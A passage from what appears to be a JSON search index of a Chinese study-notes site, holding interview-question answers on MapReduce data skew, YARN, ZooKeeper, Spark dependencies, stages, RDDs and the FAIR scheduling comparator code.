\u51cf\u5c11\u6570\u636e\u89c4\u6a21\u4ee5\u540e\uff0c\u7f51\u7edc\u4f20\u8f93\u6240\u6d88\u8017\u7684\u65f6\u95f4\u4e5f\u80fd\u591f\u51cf\u5c11\u3002","title":"2.2. MapReduce\u4e2d\u95f4\u7684Combine\u7684\u4f5c\u7528"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/Spark/2.%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%A0%94%E5%8F%91%E5%B7%A5%E7%A8%8B%E5%B8%88%E9%9D%A2%E8%AF%95%E9%A2%98%E6%95%B4%E7%90%86/#23-mapreduce","text":"\u901a\u8fc7\u5bf9 Shuffle key \u201c\u52a0\u76d0\u201d\uff08\u5373 add salt \uff09\u4f18\u5316\uff0c\u4e5f\u5c31\u662f\u5728\u54c8\u5e0c\u51fd\u6570\u4e2d\u5bf9 Key \u52a0\u5165\u968f\u673a\u566a\u58f0\uff0c\u907f\u514d\u51fa\u73b0\u6570\u636e\u503e\u659c \u4f7f\u7528\u66f4\u597d\u7684\u5206\u533a\u51fd\u6570\uff0c\u4f7f\u5206\u533a\u5c3d\u53ef\u80fd\u5747\u5300 \u8bbe\u7f6e Combiner \u51fd\u6570\uff0c\u51cf\u5c11\u6570\u636e\u89c4\u6a21 \u89e3\u51b3 Hive \u4e2d Group by \u5f15\u8d77\u7684\u503e\u659c set hive.map.aggr = true set hive.groupby.skewindata=true \u6b64\u65f6 Hive \u5728\u6570\u636e\u503e\u659c\u7684\u65f6\u5019\u4f1a\u8fdb\u884c\u8d1f\u8f7d\u5747\u8861\uff0c\u751f\u6210\u7684\u67e5\u8be2\u8ba1\u5212\u4f1a\u6709\u4e24\u4e2a MapReduce Job \u3002\u7b2c\u4e00\u4e2a MapReduce Job \u4e2d\uff0c Map \u7684\u8f93\u51fa\u7ed3\u679c\u96c6\u5408\u4f1a\u968f\u673a\u5206\u5e03\u5230 Reduce \u4e2d\uff0c\u6bcf\u4e2a Reduce \u505a\u90e8\u5206\u805a\u5408\u64cd\u4f5c\u5e76\u8f93\u51fa\u7ed3\u679c\uff0c\u8fd9\u6837\u5904\u7406\u7684\u7ed3\u679c\u662f\u76f8\u540c\u7684 GroupBy Key \u6709\u53ef\u80fd\u88ab\u5206\u5e03\u5230\u4e0d\u540c\u7684 Reduce \u4e2d\uff0c\u4ece\u800c\u8fbe\u5230\u8d1f\u8f7d\u5747\u8861\u7684\u76ee\u7684\uff1b\u7b2c\u4e8c\u4e2a Map Reduce Job \u518d\u6839\u636e\u9884\u5904\u7406\u7684\u6570\u636e\u7ed3\u679c\u6309\u7167 GroupBy Key \u5206\u5e03\u5230 Reduce \u4e2d\uff08\u8fd9\u4e2a\u8fc7\u7a0b\u53ef\u4ee5\u4fdd\u8bc1\u76f8\u540c\u7684 GroupBy Key \u88ab\u5206\u5e03\u5230\u540c\u4e00\u4e2a Reduce \u4e2d\uff09\uff0c\u6700\u540e\u5b8c\u6210\u6700\u7ec8\u7684\u805a\u5408\u64cd\u4f5c\u3002 \u53c2\u8003\u81ea \u77e5\u4e4e\u56de\u7b54 \u3002","title":"2.3. MapReduce\u51fa\u73b0\u6570\u636e\u503e\u659c\u600e\u4e48\u89e3\u51b3"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/Spark/2.%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%A0%94%E5%8F%91%E5%B7%A5%E7%A8%8B%E5%B8%88%E9%9D%A2%E8%AF%95%E9%A2%98%E6%95%B4%E7%90%86/#24-yarn","text":"YARN \u662f Hadoop \u7684\u96c6\u7fa4\u8d44\u6e90\u7ba1\u7406\u7cfb\u7edf\uff0c\u5728 Hadoop 2 \u4e2d\u88ab\u5f15\u5165\uff0c\u6700\u521d\u662f\u4e3a\u4e86\u6539\u5584 MapReduce \u7684\u7f3a\u9677\uff0c\u540c\u65f6 YARN \u4e5f\u5177\u6709\u901a\u7528\u6027\uff0c\u540c\u6837\u53ef\u4ee5\u652f\u6301\u5176\u4ed6\u7684\u5206\u5e03\u5f0f\u8ba1\u7b97\u6a21\u5f0f\u3002 \u65e7\u7248\u672c MapReduce \u4e2d\u7684 JobTracker/TaskTracker \u5728\u53ef\u6269\u5c55\u6027\u3001\u5185\u5b58\u6d88\u8017\u3001\u53ef\u9760\u6027\u548c\u7ebf\u7a0b\u6a21\u578b\u65b9\u9762\u5b58\u5728\u5f88\u591a\u95ee\u9898\uff0c\u9700\u8981\u5f00\u53d1\u8005\u505a\u5f88\u591a\u8c03\u6574\u6765\u4fee\u590d\u3002 YARN \u7684\u6838\u5fc3\u601d\u60f3\u662f\u5c06\u529f\u80fd\u5206\u5f00\uff0c\u5728 MR1 \u4e2d\uff0c JobTracker \u6709\u4e24\u4e2a\u529f\u80fd\uff0c\u4e00\u4e2a\u662f\u8d44\u6e90\u7ba1\u7406\uff0c\u53e6\u4e00\u4e2a\u662f\u4f5c\u4e1a\u8c03\u7528\u3002\u5728 YARN \u4e2d\u5219\u5206\u522b\u7531 ResourceManager \u548c ApplicationMaster \u8fdb\u7a0b\u6765\u5b9e\u73b0\u3002\u5176\u4e2d\uff0c ResourceManager \u8fdb\u7a0b\u5b8c\u6210\u6574\u4e2a\u96c6\u7fa4\u7684\u8d44\u6e90\u7ba1\u7406\u548c\u8c03\u5ea6\uff0c\u800c Application Master \u8fdb\u7a0b\u5219\u8d1f\u8d23\u5e94\u7528\u7a0b\u5e8f\u7684\u76f8\u5173\u4e8b\u52a1\uff0c\u5982\u4efb\u52a1\u8c03\u5ea6\u3001\u5bb9\u9519\u548c\u4efb\u52a1\u76d1\u63a7\u7b49\u3002 \u7cfb\u7edf\u4e2d\u6240\u6709\u5e94\u7528\u8d44\u6e90\u8c03\u5ea6\u7684\u6700\u7ec8\u51b3\u5b9a\u6743\u7531 ResourceManager \u62c5\u5f53\u3002\u6bcf\u4e2a\u5e94\u7528\u7684 ApplicationMaster \u4ece ResourceManager \u8c03\u5ea6\u8d44\u6e90\u5e76\u548c Node Maneger \u4e00\u540c\u6267\u884c\u76d1\u63a7\u4efb\u52a1\uff0c NodeManager \u4f1a\u901a\u8fc7\u5fc3\u8df3\u4fe1\u606f\u5411 ResourceManager \u6c47\u62a5\u81ea\u5df1\u6240\u5728\u8282\u70b9\u7684\u8d44\u6e90\u4f7f\u7528\u60c5\u51b5\u3002","title":"2.4. \u4ecb\u7ecdYarn"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/Spark/2.%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%A0%94%E5%8F%91%E5%B7%A5%E7%A8%8B%E5%B8%88%E9%9D%A2%E8%AF%95%E9%A2%98%E6%95%B4%E7%90%86/#25-zookeeper","text":"Zookeeper \u662f\u4e00\u79cd\u5206\u5e03\u5f0f\u534f\u8c03\u670d\u52a1\uff0c\u901a\u5e38\u62c5\u4efb\u534f\u8c03\u8005\u7684\u89d2\u8272\uff0c\u4e3b\u8981\u63d0\u4f9b\u7684\u670d\u52a1\u6709 Leader \u9009\u4e3e\u3001\u8d1f\u8f7d\u5747\u8861\u3001\u5206\u5e03\u5f0f\u961f\u5217\u548c\u5206\u5e03\u5f0f\u9501\u7b49\u3002 Leader\u9009\u4e3e \u5728\u5206\u5e03\u5f0f\u7cfb\u7edf\u4e2d\uff0c\u5e38\u89c1\u7684\u4e00\u79cd\u8f6f\u4ef6\u8bbe\u8ba1\u67b6\u6784\u4e3a Master/Slave \u3002\u5176\u4e2d Master \u8d1f\u8d23\u96c6\u7fa4\u7ba1\u7406\uff0c Slave \u8d1f\u8d23\u6267\u884c\u5177\u4f53\u7684\u4efb\u52a1\uff08\u6bd4\u5982\u5b58\u50a8\u6570\u636e\u3001\u5904\u7406\u6570\u636e\uff09\u3002\u4e3a\u4e86\u907f\u514d Master \u51fa\u73b0\u6545\u969c\u5bfc\u81f4\u6574\u4e2a\u96c6\u7fa4\u4e0d\u53ef\u7528\uff0c\u5e38\u89c1\u7684\u4f18\u5316\u65b9\u5f0f\u662f\u5f15\u5165\u591a Master \u3002\u8fd9\u53c8\u5e26\u6765\u4e86\u65b0\u7684\u95ee\u9898\uff0c\u6bd4\u5982\u5982\u4f55\u9009\u4e3e\u51fa\u4e00\u4e2a Master \u4f5c\u4e3a Active Master \uff1f\u5982\u4f55\u907f\u514d\u51fa\u73b0\u8111\u88c2\uff08 Split-Brain \uff09\uff0c\u5373\u96c6\u7fa4\u4e2d\u540c\u65f6\u5b58\u5728\u4e24\u4e2a Active Master \uff0c\u9020\u6210\u6570\u636e\u4e0d\u4e00\u81f4\u6216\u96c6\u7fa4\u51fa\u73b0\u6df7\u4e71\u7684\u73b0\u8c61\u3002 Zookeeper \u63d0\u4f9b ZAB\uff08\uff08ZooKeeper Atomic Broadcast\uff09 \u534f\u8bae\u6765\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u3002 ZAB \u534f\u8bae\u4e2d\u9009\u4e3e\u8fc7\u7a0b\u5982\u4e0b\u3002 \u6bcf\u4e2a Follower \u90fd\u5411\u5176\u4ed6\u8282\u70b9\u53d1\u9001\u9009\u81ea\u8eab\u4e3a Leader \u7684 Vote \u6295\u7968\u8bf7\u6c42\uff0c\u7b49\u5f85\u56de\u590d\uff1b Follower \u63a5\u53d7\u5230\u7684 Vote \u4e2d\u7684 ZXID \u5982\u679c\u6bd4\u81ea\u8eab\u7684\u5927\u65f6\u5219\u6295\u7968\uff0c\u5e76\u66f4\u65b0\u81ea\u8eab\u7684 Vote \uff0c\u82e5 ZXID \u4e00\u81f4\uff0c\u5219\u6bd4\u8f83\u670d\u52a1\u5668\u7684 \u552f\u4e00ID \uff08 MyId \uff09\uff0c\u82e5 Vote \u4e2d\u7684 MyId \u66f4\u5927\uff0c\u5219\u6295\u7968\uff0c\u5176\u4ed6\u60c5\u51b5\u5219\u62d2\u7edd\u6295\u7968\uff1b \u6bcf\u4e2a Follower \u4e2d\u7ef4\u62a4\u7740\u4e00\u4e2a\u6295\u7968\u8bb0\u5f55\u8868\uff0c\u5f53\u67d0\u4e2a\u8282\u70b9\u6536\u5230\u8fc7\u534a\u7684\u6295\u7968\u65f6\uff0c\u7ed3\u675f\u6295\u7968\u5e76\u628a\u8be5 Follower \u9009\u4e3a Leader \uff0c\u6295\u7968\u7ed3\u675f\uff1b \u53c2\u8003\u81ea \u7b80\u4e66\u6587\u7ae0 \u548c CSDN\u6587\u7ae0 \u3002 \u8d1f\u8f7d\u5747\u8861 Watcher \u662f ZooKeeper \u63d0\u4f9b\u7684\u53d1\u5e03/\u8ba2\u9605\u673a\u5236\uff0c\u7528\u6237\u53ef\u5728\u67d0\u4e2a Znode \u4e0a\u6ce8\u518c Watcher \u4ee5\u76d1\u542c\u5b83\u7684\u53d8\u5316\uff0c\u4e00\u65e6\u5bf9\u5e94\u7684 Znode \u88ab\u5220\u9664\u6216\u8005\u66f4\u65b0\uff08\u5305\u62ec\u5220\u9664\u3001\u6570\u636e\u57df\u88ab\u4fee\u6539\u3001\u5b50\u8282\u70b9\u53d1\u751f\u53d8\u5316\u7b49\uff09\uff0c ZooKeeper \u5c06\u4ee5\u4e8b\u4ef6\u7684\u5f62\u5f0f\u5c06\u53d8\u5316\u5185\u5bb9\u53d1\u9001\u7ed9\u76d1\u542c\u8005\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c Watcher \u4e00\u65e6\u89e6\u53d1\u540e\u4fbf\u4f1a\u88ab\u5220\u9664\uff0c\u9664\u975e\u7528\u6237\u518d\u6b21\u6ce8\u518c\u8be5 Watcher \u3002 \u7528\u6237\u53ea\u6709\u5728\u7b2c\u4e00\u6b21\u8c03\u7528\u670d\u52a1\u65f6\u9700\u8981\u67e5\u8be2\u914d\u7f6e\u4e2d\u5fc3\uff0c\u914d\u7f6e\u4e2d\u5fc3\u901a\u8fc7\u8d1f\u8f7d\u5747\u8861\u7b97\u6cd5\u9009\u53d6\u5176\u4e2d\u4e00\u53f0\u670d\u52a1\u5668\u5e76\u8fd4\u56de\u670d\u52a1\u4fe1\u606f\uff0c\u7528\u6237\u4f1a\u5c06\u67e5\u8be2\u5230\u7684\u670d\u52a1\u4fe1\u606f\u7f13\u5b58\u5230\u672c\u5730\uff0c\u540e\u9762\u7684\u8c03\u7528\u76f4\u63a5\u4f7f\u7528\u672c\u5730\u7f13\u5b58\u7684\u670d\u52a1\u5730\u5740\u4fe1\u606f\u3002\u5f53 Znode \u53d1\u751f\u53d8\u5316\u65f6\uff0c\u5b83\u4f1a\u89e6\u53d1 Watcher \u91cd\u65b0\u8fdb\u884c\u670d\u52a1\u5730\u5740\u7684\u67e5\u8be2\u3002 \u8fd9\u79cd\u65e0\u4e2d\u5fc3\u5316\u7684\u7ed3\u6784\uff0c\u4f7f\u5f97\u7528\u6237\u5728\u670d\u52a1\u4fe1\u606f\u6ca1\u6709\u53d8\u66f4\u65f6\uff0c\u51e0\u4e4e\u4e0d\u4f9d\u8d56\u914d\u7f6e\u4e2d\u5fc3\uff0c\u89e3\u51b3\u4e86\u4e4b\u524d\u8d1f\u8f7d\u5747\u8861\u8bbe\u5907\u6240\u5bfc\u81f4\u7684\u5355\u70b9\u6545\u969c\u7684\u95ee\u9898\uff0c\u5e76\u4e14\u5927\u5927\u964d\u4f4e\u4e86\u914d\u7f6e\u4e2d\u5fc3\u7684\u538b\u529b\u3002 \u53c2\u8003\u81ea \u535a\u5ba2\u56ed\u6587\u7ae0 \u3002 \u8bfb\u5199\u4e00\u81f4\u6027 \u8bfb\u8def\u5f84\uff1a\u4efb\u610f\u4e00\u4e2a ZooKeeper \u5b9e\u4f8b\u5747\u53ef\u4e3a\u5ba2\u6237\u7aef\u63d0\u4f9b\u8bfb\u670d\u52a1\u3002 ZooKeeper \u5b9e\u4f8b\u6570\u76ee\u8d8a\u591a\uff0c\u8bfb\u541e\u5410\u7387\u8d8a\u9ad8\u3002 \u5199\u8def\u5f84\uff1a\u4efb\u610f\u4e00\u4e2a ZooKeeper \u5b9e\u4f8b\u5747\u53ef\u63a5\u53d7\u5ba2\u6237\u7aef\u7684\u5199\u8bf7\u6c42\uff0c\u4f46\u9700\u8fdb\u4e00\u6b65\u8f6c\u53d1\u7ed9leader\u534f\u8c03\u5b8c\u6210\u5206\u5e03\u5f0f\u5199\u3002 ZAB \u534f\u8bae\u89c4\u5b9a\uff0c\u53ea\u8981\u591a\u6570 ZooKeeper \u5b9e\u4f8b\u5199\u6210\u529f\uff0c\u5c31\u8ba4\u4e3a\u672c\u6b21\u5199\u662f\u6210\u529f\u7684\u3002 ZooKeeper \u96c6\u7fa4\u4e2d\uff0c\u968f\u7740 ZooKeeper \u5b9e\u4f8b\u6570\u76ee\u7684\u589e\u591a\uff0c\u8bfb\u541e\u5410\u7387\u5347\u9ad8\uff0c\u4f46\u5199\u5ef6\u8fdf\u589e\u52a0\u3002\u4e3a\u4e86\u89e3\u51b3\u96c6\u7fa4\u6269\u5c55\u6027\u5bfc\u81f4\u5199\u6027\u80fd\u4e0b\u964d\u7684\u95ee\u9898\uff0c ZooKeeper \u5f15\u5165\u4e86\u7b2c\u4e09\u4e2a\u89d2\u8272\uff1a Observer \u3002 Observer \u5e76\u4e0d\u53c2\u4e0e\u6295\u7968\u8fc7\u7a0b\uff0c\u9664\u6b64\u4e4b\u5916\uff0c\u5b83\u7684\u529f\u80fd\u4e0e Follower \u7c7b\u4f3c\u3002","title":"2.5. \u4ecb\u7ecdZookeeper"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/Spark/2.%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%A0%94%E5%8F%91%E5%B7%A5%E7%A8%8B%E5%B8%88%E9%9D%A2%E8%AF%95%E9%A2%98%E6%95%B4%E7%90%86/#3-spark","text":"","title":"3. Spark"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/Spark/2.%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%A0%94%E5%8F%91%E5%B7%A5%E7%A8%8B%E5%B8%88%E9%9D%A2%E8%AF%95%E9%A2%98%E6%95%B4%E7%90%86/#31-spark","text":"\u7a84\u4f9d\u8d56\u6307\u7684\u662f\u6bcf\u4e00\u4e2a Parent RDD \u7684 Partition \u6700\u591a\u88ab\u5b50 RDD \u7684\u4e00\u4e2a Partition \u4f7f\u7528 \u5bbd\u4f9d\u8d56\u6307\u7684\u662f\u591a\u4e2a\u5b50 RDD \u7684 Partition \u4f1a\u4f9d\u8d56\u540c\u4e00\u4e2a Parent RDD \u7684 Partition","title":"3.1. Spark\u7684\u5bbd\u7a84\u4f9d\u8d56"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/Spark/2.%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%A0%94%E5%8F%91%E5%B7%A5%E7%A8%8B%E5%B8%88%E9%9D%A2%E8%AF%95%E9%A2%98%E6%95%B4%E7%90%86/#32-sparkstage","text":"\u5bbd\u4f9d\u8d56\u5c31\u662f Spark \u5212\u5206 Stage \u7684\u4f9d\u636e\u3002 \u5bf9\u4e8e\u7a84\u4f9d\u8d56\uff0c\u7531\u4e8e Partition \u4f9d\u8d56\u5173\u7cfb\u7684\u786e\u5b9a\u6027\uff0c Partition \u7684\u8f6c\u6362\u5904\u7406\u5c31\u53ef\u4ee5\u5728\u540c\u4e00\u4e2a\u7ebf\u7a0b\u91cc\u5b8c\u6210\uff0c\u7a84\u4f9d\u8d56\u88ab Spark \u5212\u5206\u5230\u540c\u4e00\u4e2a\u6267\u884c\u9636\u6bb5\u3002 \u5bf9\u4e8e\u5bbd\u4f9d\u8d56\uff0c\u7531\u4e8e Shuffle \u7684\u5b58\u5728\uff0c\u53ea\u80fd\u5728 parent RDD\uff08s\uff09 Shuffle \u5904\u7406\u5b8c\u6210\u540e\uff0c\u624d\u80fd\u5f00\u59cb\u63a5\u4e0b\u6765\u7684\u8ba1\u7b97\uff0c\u56e0\u6b64\u5bbd\u4f9d\u8d56\u5c31\u662f Spark \u5212\u5206 Stage \u7684\u4f9d\u636e\uff0c\u5373 Spark \u6839\u636e\u5bbd\u4f9d\u8d56\u5c06 DAG \u5212\u5206\u4e3a\u4e0d\u540c\u7684 Stage \u3002 \u5728\u4e00\u4e2a Stage \u5185\u90e8\uff0c\u6bcf\u4e2a Partition \u90fd\u4f1a\u88ab\u5206\u914d\u4e00\u4e2a\u8ba1\u7b97\u4efb\u52a1 \uff08Task\uff09 \uff0c\u8fd9\u4e9b Task \u662f\u53ef\u4ee5\u5e76\u884c\u6267\u884c\u7684\u3002 Stage \u4e4b\u95f4\u6839\u636e\u4f9d\u8d56\u5173\u7cfb\u53d8\u6210\u4e86\u4e00\u4e2a\u5927\u7c92\u5ea6\u7684 DAG \uff0c\u8fd9\u4e2a DAG \u7684\u6267\u884c\u987a\u5e8f\u4e5f\u662f\u4ece\u524d\u5411\u540e\u7684\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c Stage \u53ea\u6709\u5728\u5b83\u6ca1\u6709 Parent Stage \u6216\u8005 Parent Stage \u90fd\u5df2\u7ecf\u6267\u884c\u5b8c\u6210\u540e\uff0c\u624d\u53ef\u4ee5\u6267\u884c\u3002 \u4f18\u5316\uff1a \u5728\u8fdb\u884c Shuffle \u64cd\u4f5c\u65f6\uff0c\u4f1a\u5212\u5206\u65b0\u7684 Stage \u3002\u6240\u4ee5\u9700\u8981\u5c3d\u91cf\u51cf\u5c11 Shuffle \u64cd\u4f5c\u3002\u51cf\u5c11 reduceByKey\u3001groupByKey\uff0cdistinct\uff0cintersection \u64cd\u4f5c\uff0c\u7528\u5176\u4ed6\u7684\u64cd\u4f5c\u8fdb\u884c\u4ee3\u66ff\u3002","title":"3.2. Spark\u7684Stage\u662f\u600e\u4e48\u5212\u5206\u7684\uff0c\u5982\u4f55\u4f18\u5316"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/Spark/2.%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%A0%94%E5%8F%91%E5%B7%A5%E7%A8%8B%E5%B8%88%E9%9D%A2%E8%AF%95%E9%A2%98%E6%95%B4%E7%90%86/#33-sparkrdd","text":"RDD \u662f\u53ea\u8bfb\u7684\u3001\u5206\u533a\u8bb0\u5f55\u7684\u96c6\u5408\u3002 RDD \u652f\u6301\u57fa\u4e8e\u5de5\u4f5c\u96c6\u7684\u5e94\u7528\uff0c\u540c\u65f6\u5177\u6709\u6570\u636e\u6d41\u6a21\u578b\u7684\u7279\u70b9\uff1a\u81ea\u52a8\u5bb9\u9519\u3001\u4f4d\u7f6e\u611f\u77e5\u6027\u8c03\u5ea6\u548c\u53ef\u4f38\u7f29\u6027\u3002 RDD \u5141\u8bb8\u7528\u6237\u5728\u6267\u884c\u591a\u4e2a\u67e5\u8be2\u65f6\u663e\u5f0f\u5730\u5c06\u5de5\u4f5c\u96c6\u7f13\u5b58\u5728\u5185\u5b58\u4e2d\uff0c\u540e\u7eed\u7684\u67e5\u8be2\u80fd\u591f\u91cd\u7528\u5de5\u4f5c\u96c6\uff0c\u8fd9\u6781\u5927\u5730\u63d0\u5347\u4e86\u67e5\u8be2\u901f\u5ea6\u3002 \u6bcf\u4e2a RDD \u67095\u4e2a\u4e3b\u8981\u7684\u5c5e\u6027\uff1a \u4e00\u7ec4\u5206\u7247 \uff08Partition\uff09 \uff0c\u5373\u6570\u636e\u96c6\u7684\u57fa\u672c\u7ec4\u6210\u5355\u4f4d\u3002\u5bf9\u4e8e RDD \u6765\u8bf4\uff0c\u6bcf\u4e2a\u5206\u7247\u90fd\u4f1a\u88ab\u4e00\u4e2a\u8ba1\u7b97\u4efb\u52a1\u5904\u7406\uff0c\u5e76\u51b3\u5b9a\u5e76\u884c\u8ba1\u7b97\u7684\u7c92\u5ea6\u3002\u7528\u6237\u53ef\u4ee5\u5728\u521b\u5efa RDD \u65f6\u6307\u5b9a RDD \u7684\u5206\u7247\u4e2a\u6570\uff0c\u5982\u679c\u6ca1\u6709\u6307\u5b9a\uff0c\u90a3\u4e48\u5c31\u4f1a\u91c7\u7528\u9ed8\u8ba4\u503c\u3002 \u4e00\u4e2a\u8ba1\u7b97\u6bcf\u4e2a\u5206\u533a\u7684\u51fd\u6570\u3002\u80fd\u591f\u901a\u8fc7\u5bf9\u524d\u4e00\u6b65\u4f9d\u8d56\u7684\u6570\u636e\u8fdb\u884c\u8ba1\u7b97\uff0c\u5f97\u5230\u5f53\u524d RDD \u7684\u6570\u636e\u3002 RDD \u4e4b\u95f4\u7684\u4f9d\u8d56\u5173\u7cfb\u3002 RDD \u7684\u6bcf\u6b21\u8f6c\u6362\u90fd\u4f1a\u751f\u6210\u4e00\u4e2a\u65b0\u7684 RDD \uff0c\u6240\u4ee5 RDD \u4e4b\u95f4\u5c31\u4f1a\u5f62\u6210\u7c7b\u4f3c\u4e8e\u6d41\u6c34\u7ebf\u4e00\u6837\u7684\u524d\u540e\u4f9d\u8d56\u5173\u7cfb\u3002\u5728\u90e8\u5206\u5206\u533a\u6570\u636e\u4e22\u5931\u65f6\uff0c Spark \u53ef\u4ee5\u901a\u8fc7\u8fd9\u4e2a\u4f9d\u8d56\u5173\u7cfb\u91cd\u65b0\u8ba1\u7b97\u4e22\u5931\u7684\u5206\u533a\u6570\u636e\uff0c\u800c\u4e0d\u662f\u5bf9 RDD \u7684\u6240\u6709\u5206\u533a\u8fdb\u884c\u91cd\u65b0\u8ba1\u7b97\u3002 \u4e00\u4e2a Partitioner \uff0c\u5373 RDD \u7684\u5206\u7247\u51fd\u6570\u3002\u5f53\u524d Spark \u4e2d\u5b9e\u73b0\u4e86\u4e24\u79cd\u7c7b\u578b\u7684\u5206\u7247\u51fd\u6570\uff0c\u4e00\u4e2a\u662f\u57fa\u4e8e\u54c8\u5e0c\u7684 HashPartitioner \uff0c\u53e6\u5916\u4e00\u4e2a\u662f\u57fa\u4e8e\u8303\u56f4\u7684 RangePartitioner \u3002 \u4e00\u4e2a\u5217\u8868\uff0c\u5b58\u50a8\u5b58\u53d6\u6bcf\u4e2a Partition \u7684\u4f18\u5148\u4f4d\u7f6e \uff08preferred location\uff09 \u3002","title":"3.3. \u4ecb\u7ecdSpark\u7684RDD"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/Spark/2.%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%A0%94%E5%8F%91%E5%B7%A5%E7%A8%8B%E5%B8%88%E9%9D%A2%E8%AF%95%E9%A2%98%E6%95%B4%E7%90%86/#34-sparktaskschedulertask","text":"FIFO\u8c03\u5ea6 \u5bf9 s1 \u548c s2 \u4e24\u4e2a Schedulable \u7684\u4f18\u5148\u7ea7\uff08\u503c\u8d8a\u5c0f\uff0c\u4f18\u5148\u7ea7\u8d8a\u9ad8\uff09\u8fdb\u884c\u6bd4\u8f83\u3002 \u5982\u679c\u4e24\u4e2a Schedulable \u7684\u4f18\u5148\u7ea7\u76f8\u540c\uff0c\u5219\u5bf9 s1 \u548c s2 \u6240\u5c5e\u7684 Stage \u7684\u8eab\u4efd\u6807\u8bc6\u8fdb\u884c\u6bd4\u8f83\u3002 \u5982\u679c\u6bd4\u8f83\u7684\u7ed3\u679c\u5c0f\u4e8e 0 \uff0c\u5219\u4f18\u5148\u8c03\u5ea6 s1 \uff0c\u5426\u5219\u4f18\u5148\u8c03\u5ea6 s2 \u3002 FAIR\u8c03\u5ea6 \u9996\u5148\u5b9a\u4e49 minShare \u548c weight \u4e24\u4e2a\u53c2\u6570\u3002 \u8c03\u5ea6\u4ee3\u7801\u5982\u4e0b\u3002 private[spark] class FairSchedulingAlgorithm extends SchedulingAlgorithm { override def comparator(s1: Schedulable, s2: Schedulable): Boolean = { val minShare1 = s1.minShare val minShare2 = s2.minShare val runningTasks1 = s1.runningTasks val runningTasks2 = s2.runningTasks val s1Needy = runningTasks1 < minShare1 val s2Needy = runningTasks2 < minShare2 val minShareRatio1 = runningTasks1.toDouble / math.max(minShare1, 1.0) val minShareRatio2 = runningTasks2.toDouble / math.max(minShare2, 1.0) val taskToWeightRatio1 = runningTasks1.toDouble / s1.weight.toDouble val taskToWeightRatio2 = runningTasks2.toDouble / s2.weight.toDouble var compare = 0 if (s1Needy & & !s2Needy) { return true }else if (!s1Needy & & s2Needy) { return false } else if (s1Needy & & s2Needy) { compare = minShareRatio1.compareTo(minShareRatio2) } else { compare = taskToWeightRatio1.compareTo(taskToWeightRatio2) } if (compare < 0) { true } else if (compare > 0) { false } else { s1.name < s2.name } } } \u6982\u8ff0\u89c4\u5219\u5982\u4e0b\uff1a \u4f18\u5148\u8c03\u5ea6\u8fd0\u884c\u4e2d\u7684 Task \u6570\u91cf\u6bd4 minShare \u5c0f\u7684\u4efb\u52a1\u3002 \u5982\u679c\u4e24\u4e2a\u4efb\u52a1\u7684 Task \u6570\u91cf\u90fd\u6bd4 minShare \u5c0f\uff0c\u5219\u8003\u8651 Task \u548c minShare \u7684\u6bd4\u503c\uff0c\u6bd4\u503c\u5c0f\u7684\u4f18\u5148\u8c03\u5ea6\uff0c\u6bd4\u503c\u76f8\u7b49\u5219\u6bd4\u8f83\u4efb\u52a1\u540d\uff0c\u4efb\u52a1\u540d\u8f83\u5c0f\u7684\u4f18\u5148\u8c03\u5ea6\u3002 \u5982\u679c\u4e24\u4e2a\u4efb\u52a1\u7684 Task \u6570\u91cf\u90fd\u6bd4 minShare \u5927\uff0c\u5219\u8003\u8651 Task \u548c weight \u7684\u6bd4\u503c\uff0c\u6bd4\u503c\u5c0f\u7684\u4f18\u5148\u8c03\u5ea6\uff0c\u6bd4\u503c\u76f8\u7b49\u5219\u6bd4\u8f83\u4efb\u52a1\u540d\uff0c\u4efb\u52a1\u540d\u8f83\u5c0f\u7684\u4f18\u5148\u8c03\u5ea6\u3002 \u5177\u4f53\u89c4\u5219\u5982\u4e0b\uff1a \u5982\u679c s1 \u4e2d\u5904\u4e8e\u8fd0\u884c\u72b6\u6001\u7684 Task \u7684\u6570\u91cf\u5c0f\u4e8e s1 \u7684 minShare \uff0c\u5e76\u4e14 s2 \u4e2d\u5904\u4e8e\u8fd0\u884c\u72b6\u6001\u7684 Task \u7684\u6570\u91cf\u5927\u4e8e\u7b49\u4e8e s2 \u7684 minShare \uff0c\u90a3\u4e48\u4f18\u5148\u8c03\u5ea6 s1 \u3002 \u5982\u679c s1 \u4e2d\u5904\u4e8e\u8fd0\u884c\u72b6\u6001\u7684 Task \u7684\u6570\u91cf\u5927\u4e8e\u7b49\u4e8e s1 \u7684 minShare \uff0c\u5e76\u4e14 s2 \u4e2d\u5904\u4e8e\u8fd0\u884c\u72b6\u6001\u7684 Task \u7684\u6570\u91cf\u5c0f\u4e8e s2 \u7684 minShare \uff0c\u90a3\u4e48\u4f18\u5148\u8c03\u5ea6 s2 \u3002 \u5982\u679c s1 \u4e2d\u5904\u4e8e\u8fd0\u884c\u72b6\u6001\u7684 Task \u7684\u6570\u91cf\u5c0f\u4e8e s1 \u7684 minShare \uff0c\u5e76\u4e14 s2 \u4e2d\u5904\u4e8e\u8fd0\u884c\u72b6\u6001\u7684 Task \u7684\u6570\u91cf\u5c0f\u4e8e s2 \u7684 minShare \uff0c\u90a3\u4e48\u518d\u5bf9 minShareRatio1 \u548c minShareRatio2 \u8fdb\u884c\u6bd4\u8f83\u3002\u5982\u679c minShareRatio1 \u5c0f\u4e8e 